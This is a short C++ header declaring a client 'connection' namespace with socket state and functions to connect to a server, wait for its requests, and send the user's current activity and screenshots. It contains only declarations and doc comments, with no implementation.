#pragma once



// buildin lybraries
#include <netinet/in.h>



namespace connection
{
    /// @brief Was this namespace initialized before.
    static bool isInited = false;

    /// @brief Socket for client.
    static int clientSocket;

    /// @brief Server address.
    static struct sockaddr_in serverAddress;

    static pthread_t tid;


    /**
     * @brief Initializes this namespace
     * 
     */
    void Init(const char* __exePath);


    /**
     * @brief Connects this client to server
     * 
     */
    bool Connect();


    /**
     * @brief Creates thread for client talk to server
     * 
     */
    void CreateThread();


    /**
     * @brief Thread for client
     * 
     */
    void* ClientThread(void* args);


    /**
     * @brief Waits for server to request data
     * 
     */
    int GetRequest();


    /**
     * @brief Sents current activity
     * 
     */
    int SentActivity();


    /**
     * @brief Sent screenshot
     * 
     */
    int SentScreenshot();
};